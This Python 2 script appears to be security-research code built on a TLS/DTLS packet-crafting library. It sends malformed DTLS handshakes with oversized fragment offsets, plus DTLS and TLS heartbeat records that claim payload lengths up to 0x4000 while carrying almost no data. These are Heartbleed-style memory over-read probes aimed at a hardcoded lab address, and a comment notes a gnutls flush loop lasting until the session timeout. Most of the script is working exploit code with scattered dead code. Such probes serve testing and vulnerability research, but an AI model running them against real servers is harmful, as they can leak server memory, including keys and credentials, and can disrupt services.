'''
Created on Apr 13, 2014

@author: tintinweb

TODO:    
    * proto description with class only.. no serialize/unserialize
    * get rid of utils.serialize
    * move hexdump to layer
    * allow cross proto manipulations
        * upper layer accesses lower layer to set own fields
    * only serialize once
        * dirty bits? serialize on update or only on read op
    * match protocol based on layer descriptions
'''
from utils import *
from layer.ssl.dtls import *
from layer.ssl.tls import *
from layer.base import Raw,TCP,UDP

import sys



def main(opts):
    ip = opts['ip']
    port = opts['port']
    print ip,port

    udp = UDP(ip="172.16.0.55", port=443, buffer=16*1024, timeout=0.5)
    DTLSRecord.CONTENT_TYPE_ALERT
    #p =  TLSRecord(version=TLSRecord.PROTOCOL_TLS_1_0)/TLSHandshake()/TLSClientHello()4
    p = Raw(data="\x11\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00")
    p_serialized = p.serialize()
    print "sending: %d"%len(p_serialized)
    resp = udp/Raw(data=p_serialized)
    print "response: %d"%len(resp) if resp else 0 
    if resp:
        hexdump_squashed(resp)
    exit()

    
    p = DTLSRecord()/DTLSHandshake( data=DTLSClientHello())
    p_serialized = p.serialize()
    print "sending: %d"%len(p_serialized)
    resp = udp/Raw(data=p_serialized)
    print "response: %d"%len(resp) if resp else 0 
    if resp:
        hexdump_squashed(resp)



    '''
    fixlen=00
    #p = DTLSRecord(length=140+fixlen)/DTLSHandshake(length=128+fixlen,fragment_offset=fixlen,fragment_length=128, data=DTLSClientHello(cookie=DTLSPropCookie(cookie=resp[-16:])))
    p = DTLSRecord(sequence=1)/DTLSHandshake( sequence=1, fragment_offset=fixlen, data=DTLSClientHello(cookie=DTLSPropCookie(cookie=resp[-20:])))
    resp = udp/Raw(data=p.serialize())
    print "response: %d"%len(resp) if resp else 0 
    if (resp):
        hexdump_squashed(resp)
        
    '''
        
        
    '''
    gnutls 3.3.0 - flush loop until 60sec session timeout hit
    
|<11>| WRITE FLUSH: 0 bytes in buffer.
|<3>| ASSERT: gnutls_buffers.c:624
|<11>| WRITE FLUSH: 0 bytes in buffer.
|<3>| ASSERT: gnutls_buffers.c:624

    '''

    resp1=resp[:]
    for i in xrange(0,0xffffff,0x30):
        
  
           
        fixlen=0xffff
        #p = DTLSRecord(length=140+fixlen)/DTLSHandshake(length=128+fixlen,fragment_offset=fixlen,fragment_length=128, data=DTLSClientHello(cookie=DTLSPropCookie(cookie=resp[-16:])))
        p = DTLSRecord(sequence=1)/DTLSHandshake( sequence=1, fragment_offset=fixlen, data=DTLSClientHello(cookie=DTLSPropCookie(cookie=resp1[-20:])))
        print "--- %d ----"%i
        resp = udp/Raw(data=p.serialize())
        print "response: %d"%len(resp) if resp else 0 
        if (resp):
            hexdump_squashed(resp)    
            
        
        p = DTLSRecord(sequence=2, content_type=DTLSRecord.CONTENT_TYPE_HEARTBEAT, length=1400+2)/TLSHeartBeat(payload='a', payload_length=1400)
        #p = DTLSRecord(sequence=0, content_type=DTLSRecord.CONTENT_TYPE_HEARTBEAT)/Raw(data="\x01\x40\x00\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50")
        resp = udp/Raw(data=p.serialize())
        print "response: %d"%len(resp) if resp else 0 
        if (resp):
           hexdump_squashed(resp)
        print "--END--"             
        
        udp = UDP(ip="172.16.0.55", port=443, buffer=16*1024, timeout=0)
        udp/Raw(data="hi")
        exit()

     
        
        
    p = DTLSRecord(sequence=0, content_type=DTLSRecord.CONTENT_TYPE_HEARTBEAT)/TLSHeartBeat(payload_length=0x4000)
    #p = DTLSRecord(sequence=0, content_type=DTLSRecord.CONTENT_TYPE_HEARTBEAT)/Raw(data="\x01\x40\x00\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50")
    resp = udp/Raw(data=p.serialize())
    print "response: %d"%len(resp) if resp else 0 
    if (resp):
        hexdump_squashed(resp)
    print "--END--"
    exit()
    
    
    
    
    
    
    
    
    print "[ -> ] sending TLS Handshake"
    resp = tcp/Raw(data=serialize(TLSRecord(version=0x0302, content_type=0x16)/TLSHandshake(version=0x0302)))
    print "[ <- ] response: %s"%(len(resp) if resp else 0)
    hexdump_squashed(resp)
    print repr(TLSRecord(__raw=resp))
    
    print "[ -> ] sending TLS Handshake"
    resp = tcp/Raw(data=serialize(TLSRecord(version=0x0302)/TLSHeartBeat(payload_length=0x4000)))
    print "[ <- ] response: %s"%(len(resp) if resp else 0)
    if not resp:
        print "no response!"
        return

    hexdump_squashed(resp) 
    print repr(TLSRecord(__raw=resp))
    

if __name__=="__main__":
    opts = {'ip':'172.16.0.55',
            'port':443}
    main(opts)
    exit()